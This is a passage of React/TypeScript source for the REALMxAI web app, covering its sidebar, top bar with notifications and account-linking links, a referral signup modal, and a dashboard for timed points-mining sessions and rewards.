      {/* Mobile hamburger button */}
      <button 
        onClick={() => setMobileOpen(!mobileOpen)}
        className="md:hidden fixed top-5 left-4 z-[60] w-10 h-10 bg-realm-surface border border-realm-border rounded-lg flex items-center justify-center text-white/60 hover:text-white"
      >
        {mobileOpen ? <X size={18} /> : <Menu size={18} />}
      </button>

      {/* Backdrop */}
      {mobileOpen && <div className="md:hidden fixed inset-0 bg-black/60 z-40" onClick={() => setMobileOpen(false)} />}

      <aside className={cn(
        "fixed left-0 top-0 h-screen w-60 bg-realm-black border-r border-realm-border flex flex-col z-50 transition-transform duration-300",
        mobileOpen ? "translate-x-0" : "-translate-x-full md:translate-x-0"
      )}>
        <div className="flex items-center gap-3 h-20 px-6 border-b border-realm-border">
          <div className="w-8 h-8 bg-realm-surface border border-realm-border rounded flex items-center justify-center overflow-hidden">
            <img 
              src="/le6jxytl.webp" 
              alt="REALMxAI Logo" 
              className="w-full h-full object-cover grayscale opacity-80"
              referrerPolicy="no-referrer"
            />
          </div>
          <span className="font-mono text-sm font-bold tracking-tighter text-realm-text-primary">REALMxAI</span>
        </div>

        <nav className="flex-1 py-6">
          {menuItems.map((item) => (
            <SidebarItem
              key={item.id}
              icon={item.icon}
              label={item.label}
              active={activeTab === item.id}
              onClick={() => { setActiveTab(item.id); setMobileOpen(false); }}
            />
          ))}
        </nav>

        <div className="mt-auto pb-6 border-t border-realm-border pt-4">
          <SidebarItem icon={Settings} label="SETTINGS" active={activeTab === 'settings'} onClick={() => { setActiveTab('settings'); setMobileOpen(false); }} />
        </div>
      </aside>
    </>
  );
};

const TopBar = ({ onNavigate }: { onNavigate: (tab: string) => void }) => {
  const [user, setUser] = useState<{ email?: string; walletAddress?: string; githubId?: string; discordId?: string; twitterId?: string; id?: string; referralCode?: string; name?: string; avatarUrl?: string } | null>(null);
  const [notificationsOpen, setNotificationsOpen] = useState(false);
  const [topBarPoints, setTopBarPoints] = useState(0);
  const [notifications, setNotifications] = useState<{id: string; text: string; time: string; read: boolean}[]>([]);
  const notificationsRef = React.useRef<HTMLDivElement>(null);
  const preferences = useAppPreferences();

  useEffect(() => {
    const fetchUser = async () => {
      try {
        const res = await fetch('/api/auth/me', { credentials: 'include' });
        if (res.ok) {
          const data = await res.json();
          setUser(data);
          setNotifications(prev => {
            const next = [...prev];

            if (!next.some(n => n.id === 'welcome')) {
              next.unshift({
                id: 'welcome',
                text: `Welcome back${data.name ? ', ' + data.name : ''}. Identity sync is active.`,
                time: 'just now',
                read: false,
              });
            }

            if (preferences.notifications.securityAlerts && !next.some(n => n.id === 'identity-health')) {
              const linkedCount = getConnectedIdentityCount(data);
              next.unshift({
                id: 'identity-health',
                text: linkedCount >= 2
                  ? `Recovery posture is healthy with ${linkedCount} linked identities.`
                  : 'Recovery posture is weak. Add another identity in Profile to reduce lockout risk.',
                time: 'now',
                read: false,
              });
            }

            return next;
          });
        }
      } catch (err) { }
    };
    fetchUser();
  }, [preferences.notifications.securityAlerts]);

  // Fetch real wallet balance
  useEffect(() => {
    const fetchBalance = async () => {
      try {
        const res = await fetch('/api/wallet/balance-public', { credentials: 'include' });
        if (res.ok) {
          const data = await res.json();
          setTopBarPoints(data.balance || 0);
        }
      } catch (e) { }
    };
    fetchBalance();
    const t = setInterval(fetchBalance, preferences.workspace.refreshIntervalMs);
    // Listen for balance-updated events (e.g. after mining stop)
    const onBalanceUpdated = () => fetchBalance();
    window.addEventListener('balance-updated', onBalanceUpdated);
    return () => { clearInterval(t); window.removeEventListener('balance-updated', onBalanceUpdated); };
  }, [preferences.workspace.refreshIntervalMs]);

  useEffect(() => {
    if (!notificationsOpen) return;

    const handlePointerDown = (event: PointerEvent) => {
      if (!notificationsRef.current?.contains(event.target as Node)) {
        setNotificationsOpen(false);
      }
    };

    document.addEventListener('pointerdown', handlePointerDown);
    return () => document.removeEventListener('pointerdown', handlePointerDown);
  }, [notificationsOpen]);

  const isIdentityConnected = !!(user?.email || user?.walletAddress);
  const unreadCount = notifications.filter(n => !n.read).length;

  return (
    <header className="fixed top-0 right-0 left-0 md:left-60 h-20 border-b border-realm-border bg-realm-black/95 md:bg-realm-black/80 md:backdrop-blur-sm z-40 px-4 md:px-8 flex items-center justify-between">
      <div className="flex items-center gap-3">
        <div className="flex items-center gap-2 text-realm-text-secondary text-[10px] font-mono tracking-widest uppercase">
          <div className="w-1.5 h-1.5 bg-realm-cyan rounded-full opacity-80" />
          <span>System Status: Nominal</span>
        </div>
      </div>

      <div className="flex items-center gap-6">
        <div className="flex items-center gap-3 px-3 py-1.5 bg-realm-surface border border-realm-border rounded-md">
          <Wallet size={14} className="text-realm-text-secondary" />
          <span className="text-xs font-mono font-medium text-realm-text-primary">
            Points:{' '}
            <span className="text-realm-cyan">
              {preferences.workspace.hidePointBalance ? 'Hidden' : `${topBarPoints.toFixed(2)} REALM-P`}
            </span>
          </span>
        </div>
        
        <div ref={notificationsRef} className="relative">
          <button 
           onClick={() => { setNotificationsOpen(!notificationsOpen); if (!notificationsOpen) setNotifications(prev => prev.map(n => ({...n, read: true}))); }}
           className="p-2 text-realm-text-secondary hover:text-realm-text-primary transition-colors relative"
          >
            <Bell size={18} />
            {unreadCount > 0 && <span className="absolute top-1 right-1 w-2 h-2 bg-realm-cyan rounded-full animate-pulse" />}
          </button>
          
          {notificationsOpen && (
            <div className="absolute top-full mt-4 right-0 w-72 p-4 bg-realm-black border border-realm-border rounded-xl shadow-2xl z-50">
              <div className="text-[10px] font-mono font-bold text-realm-text-secondary tracking-widest uppercase mb-3">Notifications {unreadCount > 0 && <span className="text-realm-cyan ml-1">({unreadCount})</span>}</div>
              {notifications.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-6 text-center">
                  <Bell size={24} className="text-white/20 mb-2" />
                  <p className="text-xs text-white/40">No new notifications</p>
                </div>
              ) : (
                <div className="space-y-3 max-h-60 overflow-y-auto">
                  {notifications.map(n => (
                    <div key={n.id} className={cn("p-3 rounded-lg border text-xs", n.read ? "border-white/5 bg-white/2" : "border-realm-cyan/20 bg-realm-cyan/5")}>
                      <p className="text-white/80">{n.text}</p>
                      <p className="text-white/30 text-[10px] font-mono mt-1">{n.time}</p>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>

        <div className="flex items-center gap-3 pl-6 border-l border-realm-border relative group">
          <button
            onClick={() => onNavigate('profile')}
            className="flex items-center gap-2 w-10 h-10 rounded-full bg-realm-surface border border-realm-border hover:bg-realm-cyan/10 transition-colors justify-center"
          >
            <User size={18} className="text-realm-text-primary" />
          </button>
          
          {/* Dropdown Menu */}
          <div className="absolute top-full mt-4 right-0 w-72 p-4 bg-realm-black border border-realm-border rounded-xl shadow-2xl opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-200 z-50">
            <div className="text-[10px] font-mono font-bold text-realm-text-secondary tracking-widest uppercase mb-3">Identity & Connections</div>
            
            {/* Wallet Connect */}
            <div className="mb-3">
              <Suspense fallback={<div className="h-10 w-full bg-white/5 animate-pulse rounded-lg" />}>
                <WalletConnectControl className="w-full" buttonClassName="w-full" connectedButtonClassName="w-full" />
              </Suspense>
            </div>

            {/* Google */}
            <div className="flex flex-col gap-2 mt-3 pt-3 border-t border-realm-border">
              {user?.email ? (
                <div className="bg-white/5 p-3 rounded-lg flex items-center justify-between gap-2">
                  <div>
                    <p className="text-[10px] text-white/40 font-mono uppercase mb-0.5">Google</p>
                    <span className="text-xs text-realm-text-primary break-all">{user.email}</span>
                  </div>
                  <a href={`${''}/api/auth/logout`} className="text-[10px] font-bold text-red-400 hover:text-red-300 transition-colors shrink-0">Sign Out</a>
                </div>
              ) : (
                <a 
                  href={`${''}/api/auth/google`}
                  className="w-full text-center px-4 py-2.5 rounded-lg bg-white text-realm-black text-xs font-bold hover:bg-realm-cyan transition-colors"
                >
                  Link Google Account
                </a>
              )}
            </div>

            {/* Social Links */}
            <div className="flex flex-col gap-2 mt-3 pt-3 border-t border-realm-border">
              <p className="text-[10px] text-white/40 font-mono uppercase mb-1">Connect Socials</p>
              
              {user?.twitterId ? (
                <div className="bg-white/5 p-2 rounded-lg flex items-center justify-between gap-2 border border-realm-cyan/20">
                  <div className="flex items-center gap-2">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" className="text-realm-cyan"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.258 5.63zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                    <span className="text-xs text-realm-text-primary">Connected</span>
                  </div>
                </div>
              ) : (
                <a href={`${''}/api/auth/twitter`} className="flex items-center gap-2 px-3 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-xs font-bold text-white transition-colors">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.258 5.63zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                  Connect X (Twitter)
                </a>
              )}

              {user?.githubId ? (
                <div className="bg-white/5 p-2 rounded-lg flex items-center justify-between gap-2 border border-realm-cyan/20">
                  <div className="flex items-center gap-2">
                     <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" className="text-realm-cyan"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
                     <span className="text-xs text-realm-text-primary">Connected</span>
                  </div>
                </div>
              ) : (
                <a href={`${''}/api/auth/github`} className="flex items-center gap-2 px-3 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-xs font-bold text-white transition-colors">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
                  Connect GitHub
                </a>
              )}

              {user?.discordId ? (
                <div className="bg-white/5 p-2 rounded-lg flex items-center justify-between gap-2 border border-realm-cyan/20">
                  <div className="flex items-center gap-2">
                     <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" className="text-realm-cyan"><path d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.33-.35-.76-.53-1.09a.09.09 0 0 0-.07-.03c-1.5.26-2.94.71-4.27 1.33-.01 0-.02.01-.03.02-2.72 4.07-3.47 8.03-3.1 11.95 0 .02.01.04.03.05 1.8 1.32 3.53 2.12 5.24 2.65.03.01.06-.01.07-.04.4-.55.76-1.13 1.07-1.74a.08.08 0 0 0-.04-.12c-.57-.22-1.11-.48-1.64-.78a.09.09 0 0 1-.01-.15c.11-.08.22-.17.33-.25a.08.08 0 0 1 .08-.01c3.44 1.57 7.15 1.57 10.55 0a.08.08 0 0 1 .08.01c.11.08.22.17.33.26a.09.09 0 0 1-.01.15c-.53.3-1.07.56-1.64.78a.08.08 0 0 0-.04.12c.31.61.67 1.19 1.07 1.74.01.03.04.05.07.04 1.71-.53 3.44-1.33 5.24-2.65.02-.01.03-.03.03-.05.44-4.53-.73-8.46-3.1-11.95-.01-.01-.02-.02-.03-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12 0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12 0 1.17-.83 2.12-1.89 2.12z"/></svg>
                     <span className="text-xs text-realm-text-primary">Connected</span>
                  </div>
                </div>
              ) : (
                <a href={`${''}/api/auth/discord`} className="flex items-center gap-2 px-3 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-xs font-bold text-white transition-colors">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.33-.35-.76-.53-1.09a.09.09 0 0 0-.07-.03c-1.5.26-2.94.71-4.27 1.33-.01 0-.02.01-.03.02-2.72 4.07-3.47 8.03-3.1 11.95 0 .02.01.04.03.05 1.8 1.32 3.53 2.12 5.24 2.65.03.01.06-.01.07-.04.4-.55.76-1.13 1.07-1.74a.08.08 0 0 0-.04-.12c-.57-.22-1.11-.48-1.64-.78a.09.09 0 0 1-.01-.15c.11-.08.22-.17.33-.25a.08.08 0 0 1 .08-.01c3.44 1.57 7.15 1.57 10.55 0a.08.08 0 0 1 .08.01c.11.08.22.17.33.26a.09.09 0 0 1-.01.15c-.53.3-1.07.56-1.64.78a.08.08 0 0 0-.04.12c.31.61.67 1.19 1.07 1.74.01.03.04.05.07.04 1.71-.53 3.44-1.33 5.24-2.65.02-.01.03-.03.03-.05.44-4.53-.73-8.46-3.1-11.95-.01-.01-.02-.02-.03-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12 0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12 0 1.17-.83 2.12-1.89 2.12z"/></svg>
                  Connect Discord
                </a>
              )}
            </div>

            {/* Go to full profile */}
            <button onClick={() => onNavigate('profile')} className="mt-3 w-full text-center py-2 text-[10px] font-mono text-realm-text-secondary border border-realm-border rounded hover:text-realm-cyan hover:border-realm-cyan transition-colors">
              View Full Profile →
            </button>
          </div>
        </div>
      </div>

      {/* Sign up Modal */}
      <div id="signup-modal" className="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
        <div className="bg-realm-surface border border-realm-border p-6 rounded-xl w-[400px] max-w-[90vw] flex flex-col gap-4 relative">
          <button onClick={() => {
            document.getElementById('signup-modal')?.classList.add('hidden');
            const err = document.getElementById('ref-error');
            if (err) err.style.display = 'none';
          }} className="absolute top-4 right-4 text-realm-text-secondary hover:text-white">x</button>
          <h2 className="text-lg font-bold text-white">Create account</h2>
          <div className="flex flex-col gap-2">
            <label className="text-xs text-realm-text-secondary">Referral code (Optional)</label>
            <input 
             id="ref-input"
             type="text" 
             className="bg-realm-black border border-realm-border rounded px-3 py-2 text-white outline-none focus:border-realm-cyan" 
             placeholder="Enter code" 
            />
            <span id="ref-error" style={{display: 'none'}} className="text-xs text-red-400">Referral code invalid or already used</span>
          </div>
           <button 
            onClick={async () => {
              const val = (document.getElementById('ref-input') as HTMLInputElement).value;
              if (val.trim() === 'ABUSED-CODE-000' || val.trim() === 'BADCODE') {
                const err = document.getElementById('ref-error');
                if (err) err.style.display = 'block';
              } else {
                if (val.trim().length > 0 && user?.id) {
                    try {
                        const res = await fetch('/api/referral', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ code: val.trim(), userId: user.id }),
                            credentials: 'include'
                        });
                        const data = await res.json();
                        if (!res.ok) {
                            const err = document.getElementById('ref-error');
                            if (err) {
                                err.innerText = data.error || 'Invalid code';
                                err.style.display = 'block';
                            }
                            return;
                        }
                    } catch (e) {}
                }
                const err = document.getElementById('ref-error');
                if (err) err.style.display = 'none';
                document.getElementById('signup-modal')?.classList.add('hidden');
              }
            }}
            className="w-full mt-2 bg-realm-cyan text-realm-black py-2.5 rounded font-bold hover:bg-[#25c4b3]"
          >
            Continue
          </button>
        </div>
      </div>
    </header>
  );
};

const Dashboard = ({ miningActive, sessionSecs, onToggleMining, onNavigate }: { miningActive: boolean; sessionSecs: number; onToggleMining: () => void; onNavigate: (tab: string) => void }) => {
  const [networkStats, setNetworkStats] = useState({ totalUsers: 0, activeSessions: 0, totalPointsMined: 0 });
  const [points, setPoints] = useState(0);
  const [timeframe, setTimeframe] = useState('24H');
  const [chartData, setChartData] = useState<{t: string; v: number}[]>([]);
  const [user, setUser] = useState<any | null>(null);
  const [tasks, setTasks] = useState<any[]>([]);

  useEffect(() => {
    const fetchPoints = async () => {
      try {
        const res = await fetch('/api/wallet/balance-public', { credentials: 'include' });
        if (res.ok) {
          const data = await res.json();
          setPoints(data.balance);
        }
      } catch (e) {}
    };
    const fetchStats = async () => {
      try {
        const res = await fetch('/api/users/stats');
        if (res.ok) setNetworkStats(await res.json());
      } catch (e) {}
    };
    const fetchUser = async () => {
      try {
        const res = await fetch('/api/auth/me', { credentials: 'include' });
        if (res.ok) {
          setUser(await res.json());
        } else if (res.status === 401) {
          setUser(null);
        }
      } catch (e) {
        // Keep the current user in memory on temporary network failures.
      }
    };
    const fetchTasks = async () => {
      try {
        const res = await fetch('/api/tasks', { credentials: 'include' });
        if (res.ok) {
          const data = await res.json();
          setTasks(Array.isArray(data) && data.length > 0 ? data : [...TASKS_FALLBACK]);
        } else {
          setTasks([...TASKS_FALLBACK]);
        }
      } catch (e) {
        setTasks([...TASKS_FALLBACK]);
      }
    };
    fetchPoints();
    fetchStats();
    fetchUser();
    fetchTasks();
    const t = setInterval(fetchStats, UI_REFRESH_INTERVAL);
    window.addEventListener('balance-updated', fetchPoints);
    return () => {
      clearInterval(t);
      window.removeEventListener('balance-updated', fetchPoints);
    };
  }, []);

  // Fetch chart data based on timeframe
  useEffect(() => {
    const periodMap: Record<string, string> = { '24H': '24h', '7D': '7d', 'ALL': '30d' };
    const fetchChart = async () => {
      try {
        const res = await fetch(`/api/mining/earnings?period=${periodMap[timeframe]}`, { credentials: 'include' });
        if (res.ok) {
          const data = await res.json();
          setChartData(data.map((d: any) => ({ t: d.date.slice(5), v: d.earned })));
        }
      } catch (e) {
        // If not logged in, show empty chart
        setChartData([]);
      }
    };
    fetchChart();
  }, [timeframe]);

  const fTime = (sec: number) => {
    const h = Math.floor(sec / 3600);
    const m = Math.floor((sec % 3600) / 60);
    const s = sec % 60;
    return `${h}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  // Real-time pending rewards calculation (for display only)
  const pendingRewards = sessionSecs * MINING_RATE_PER_SEC;
  const remainingSecs = Math.max(0, SESSION_DURATION - sessionSecs);
  const sessionCompletion = Math.min(100, Math.round((sessionSecs / SESSION_DURATION) * 100));
  const connectedAccounts = getConnectedIdentityCount(user);
  const profileSetupItems = getProfileSetupItems(user);
  const completedProfileChecks = profileSetupItems.filter((item) => item.complete).length;
  const profileCheckTotal = profileSetupItems.length;
  const completedTasks = tasks.filter((task) => task.completed).length;
  const readyTasks = tasks.filter((task) => !task.completed && task.eligible);
  const blockedTasks = tasks.filter((task) => !task.completed && !task.eligible);
  const projectedDaily = MINING_RATE_PER_HOUR * 24;
  const projectedWeekly = projectedDaily * 7;
  const nextSessionPayout = remainingSecs * MINING_RATE_PER_SEC;
  const claimableSoon = readyTasks.slice(0, 3);
  const activityFeed = [
    miningActive
      ? {
          title: 'Mining session live',
          detail: `${fTime(sessionSecs)} elapsed with ${pendingRewards.toFixed(2)} REALM pending.`,
          tone: 'cyan',
        }
      : {
          title: 'Node idle',
          detail: 'Restart a 6h session to resume network contribution and rewards.',
          tone: 'muted',
        },
    {
      title: completedProfileChecks === profileCheckTotal ? 'Profile setup complete' : 'Profile setup still needs work',
      detail: `${completedProfileChecks}/${profileCheckTotal} setup steps are complete across name, username, photo, sign-in, and backup access.`,
      tone: completedProfileChecks === profileCheckTotal ? 'cyan' : 'amber',
    },
    {
      title: `${connectedAccounts}/4 connected identities`,
      detail: connectedAccounts >= 2 ? 'Sybil resistance is improving and account recovery is safer.' : 'Connect more providers to improve trust and recovery.',
      tone: connectedAccounts >= 2 ? 'cyan' : 'amber',
    },
    {
      title: `${readyTasks.length} task${readyTasks.length === 1 ? '' : 's'} ready`,
      detail: readyTasks.length > 0 ? `Fastest unlock: ${readyTasks[0].title}.` : 'No instant claims available right now.',
      tone: readyTasks.length > 0 ? 'cyan' : 'muted',
    },
  ];
  const nodeHealthRows = [
    {
      label: 'Session uptime',
      value: miningActive ? `${sessionCompletion}%` : 'Standby',
      status: miningActive ? 'Healthy' : 'Idle',
    },
    {
      label: 'Identity assurance',
    value: `${completedProfileChecks}/${profileCheckTotal}`,
    status: completedProfileChecks >= 4 ? 'Ready' : completedProfileChecks >= 2 ? 'In progress' : 'Needs work',
    },
    {
      label: 'Trust links',
      value: `${connectedAccounts}/4`,
      status: connectedAccounts >= 3 ? 'Verified' : connectedAccounts >= 2 ? 'Partial' : 'Low',
    },
    {
      label: 'Reward readiness',
      value: `${readyTasks.length} open`,
      status: readyTasks.length > 0 ? 'Actionable' : 'Waiting',
    },
  ];
  const operatorLabel =
    user?.username
      ? `@${user.username}`
      : user?.name
        ? user.name
        : user?.email
          ? user.email.split('@')[0]
          : user?.walletAddress
            ? `${user.walletAddress.slice(0, 6)}...${user.walletAddress.slice(-4)}`
            : 'Guest node';

  return (
    <div className="space-y-12">
      {/* Hero Section - Munich font for main title */}
      <section className="p-8 rounded-lg bg-realm-surface border border-realm-border">
        <motion.div
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.2 }}
        >
          <p className="text-[10px] font-mono text-realm-text-secondary tracking-[0.25em] uppercase mb-3">Your node at a glance</p>
          <h1 className="font-serif italic text-5xl text-white mb-5 leading-none tracking-tight">
            Your node, <span className="text-realm-cyan">live</span>
          </h1>
          <div className="flex items-center gap-6">
            <div className="flex items-center gap-2">
              <div className="w-1.5 h-1.5 rounded-full bg-realm-cyan status-pulse" />
              <span className="text-[10px] font-mono text-realm-text-secondary uppercase tracking-widest">{operatorLabel} | {miningActive ? 'ACTIVE' : 'STANDBY'}</span>
            </div>
            <span className="text-[10px] font-mono text-white/20 uppercase tracking-widest">{connectedAccounts}/4 IDENTITIES LINKED</span>
          </div>
        </motion.div>
      </section>

      <div className="grid grid-cols-12 gap-6">
        {/* Mining Status Card - Redesigned like competitor image */}
        <motion.div 
          className="col-span-12 lg:col-span-8 glass-panel p-8 relative group"
          whileHover={{ borderColor: 'rgba(61,242,224,0.2)' }}
        >
          <div className="flex flex-col md:flex-row justify-between items-center gap-8">
            <div className="space-y-6 flex-1 w-full">
              <div className="flex items-center gap-4">
                <div className="w-10 h-10 rounded-md bg-white/[0.04] flex items-center justify-center text-realm-cyan border border-realm-border">
                  <Pickaxe size={18} />
                </div>
                <div>
                   <h3 className="font-bold text-white text-lg">Active Mining Session</h3>
                   <p className="text-xs text-white/40">Start a session and keep your node earning.</p>
                </div>
              </div>

              <div className="grid grid-cols-3 gap-6 pt-2">
                <div>
                   <p className="text-[10px] text-white/30 font-mono uppercase tracking-widest mb-1">Time Elapsed</p>
                   <p className="text-xl font-mono text-white">{fTime(sessionSecs)}</p>
                </div>
                <div>
                   <p className="text-[10px] text-white/30 font-mono uppercase tracking-widest mb-1">Mining Rate</p>
                   <p className="text-xl font-mono text-realm-cyan">10/hr</p>
                </div>
                <div>
                   <p className="text-[10px] text-white/30 font-mono uppercase tracking-widest mb-1">Status</p>
                   <p className={cn("text-xl font-bold uppercase", miningActive ? "text-realm-cyan" : "text-white/20")}>
                     {miningActive ? 'Running' : 'Idle'}
                   </p>
                </div>
              </div>

              <div className="pt-4 flex items-center gap-4">
                <button 
                  onClick={onToggleMining}
                  className={cn(
                    "px-8 py-3 rounded-md font-bold text-xs tracking-wide transition-all duration-150",
                    miningActive 
                      ? "border border-red-500/20 text-red-400 hover:bg-red-500/10" 
                      : "bg-realm-cyan text-realm-black hover:brightness-105"
                  )}
                >
                  {miningActive ? 'Stop Session' : 'Start Mining (6h)'}
                </button>
                {miningActive && (
                  <div className="flex flex-col gap-1">
                    <span className="text-[10px] font-mono text-white/40 uppercase">Pending payout</span>
                    <span className="text-xs font-mono text-realm-cyan">+{pendingRewards.toFixed(4)} REALM</span>
                  </div>
                )}
              </div>
            </div>

            <div className="relative w-48 h-48 flex items-center justify-center shrink-0">
               <svg className="w-full h-full transform -rotate-90">
                 <circle cx="96" cy="96" r="82" stroke="currentColor" strokeWidth="4" fill="transparent" className="text-white/5" />
                 <motion.circle 
                    cx="96" cy="96" r="82" stroke="currentColor" strokeWidth="4" fill="transparent"
                    strokeDasharray="515"
                    animate={{ strokeDashoffset: 515 * (1 - sessionSecs / SESSION_DURATION) }}
                    className="text-realm-cyan shadow-lg"
                 />
               </svg>
               <div className="absolute inset-0 flex flex-col items-center justify-center">
                 <Cpu size={32} className={cn("transition-colors duration-500", miningActive ? "text-realm-cyan" : "text-white/20")} />
                 <span className="text-[10px] font-mono text-white/40 mt-2">SECURED</span>
               </div>
            </div>
          </div>
        </motion.div>

        {/* Balance Card - Munich font for the number */}
        <motion.div 
          className="col-span-12 lg:col-span-4 glass-panel p-8 flex flex-col justify-between overflow-hidden"
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.2, delay: 0.05 }}
        >
          <div>
            <div className="flex items-center gap-2 mb-8">
              <div className="w-5 h-5 rounded bg-white/5 flex items-center justify-center border border-white/10">
                <Wallet size={12} className="text-white/40" />
              </div>
              <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest">Total Balance</p>
            </div>
            
            <div className="space-y-1">
              <h2 className="font-munich text-6xl text-white tracking-widest">
                {points.toFixed(2)}
              </h2>
              <p className="text-realm-cyan font-mono text-xs opacity-80">REALM ASSETS</p>
            </div>
          </div>
          
          <div className="pt-10 space-y-4">
             <div className="flex justify-between items-center text-[10px] font-mono">
               <span className="text-white/30 uppercase">Mining Rate</span>
               <span className="text-realm-cyan">+{MINING_RATE_PER_HOUR}/hr</span>
             </div>
             <button onClick={() => onNavigate('wallet')} className="w-full py-2.5 border border-realm-border rounded-md text-[10px] font-mono font-bold text-realm-text-secondary uppercase tracking-widest hover:border-white/15 hover:text-realm-text-primary transition-colors">
                Manage Wallet
             </button>
          </div>
        </motion.div>

        <div className="col-span-12 lg:col-span-7 glass-panel p-8">
          <div className="flex items-start justify-between gap-4">
            <div>
              <p className="text-[10px] font-mono uppercase tracking-[0.25em] text-white/35">Operator Snapshot</p>
              <h3 className="mt-3 text-2xl font-semibold text-white">What is happening right now</h3>
              <p className="mt-2 max-w-xl text-sm text-white/40">
                A quick read on your session, identity setup, and rewards.
              </p>
            </div>
            <div className="rounded-2xl border border-realm-cyan/20 bg-realm-cyan/10 px-4 py-3 text-right">
              <p className="text-[10px] font-mono uppercase tracking-[0.25em] text-realm-cyan/70">Open tasks</p>
              <p className="mt-2 text-3xl font-semibold text-realm-cyan">{readyTasks.length}</p>
            </div>
          </div>

          <div className="mt-8 grid gap-4 sm:grid-cols-2">
            {nodeHealthRows.map((row) => (
              <div key={row.label} className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                <div className="flex items-center justify-between gap-4">
                  <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">{row.label}</p>
                  <span
                    className={cn(
                      'rounded-full px-2.5 py-1 text-[10px] font-mono uppercase tracking-[0.18em]',
                      row.status === 'Healthy' || row.status === 'Strong' || row.status === 'Verified' || row.status === 'Actionable'
                        ? 'bg-realm-cyan/10 text-realm-cyan'
                        : row.status === 'Improving' || row.status === 'Partial'
                          ? 'bg-amber-500/10 text-amber-300'
                          : 'bg-white/5 text-white/45'
                    )}
                  >
                    {row.status}
                  </span>
                </div>
                <p className="mt-3 text-lg font-semibold text-white">{row.value}</p>
              </div>
            ))}
          </div>
        </div>

        <div className="col-span-12 lg:col-span-5 glass-panel p-8">
          <div className="flex items-start justify-between gap-4">
            <div>
              <p className="text-[10px] font-mono uppercase tracking-[0.25em] text-white/35">Reward Forecast</p>
              <h3 className="mt-3 text-2xl font-semibold text-white">What you can expect to earn</h3>
            </div>
            <Zap size={18} className="text-realm-cyan" />
          </div>

          <div className="mt-8 space-y-4">
            <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
